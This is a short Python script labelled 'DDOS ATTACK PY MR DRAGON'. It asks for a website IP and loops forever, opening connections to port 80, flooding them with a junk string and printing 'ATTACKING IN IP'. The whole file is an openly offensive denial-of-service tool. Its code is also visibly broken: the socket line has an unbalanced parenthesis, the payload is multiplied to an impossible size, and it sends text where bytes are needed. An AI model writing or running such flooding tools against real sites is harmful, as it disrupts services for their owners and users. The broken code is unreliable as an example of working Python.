import os, sys, time
def slowtype(t):
   for D in t + "\n":
   	sys.stdout.write(D)
   	sys.stdout.flush()
   	time.sleep(6/100)
os.system ('clear')
slowtype ("\033[33;1mDDOS ATTACK PY MR DRAGON")
print ("___________________")
import socket
ip = input ("\033[36;1mEnter ip website : ")
while True:
	sock = socket.socket.AF_INET ,socket.SOCK_STREAM)
	socket.setdefaulttimeout(1)
	conn = sock.connect((ip,80))
	data = ("\033[31mjdirir8rjdjd8rjddjdjdnfnfnfn"*999999999999)
	sock.send(data)
	print ("ATTACKING IN IP",ip )
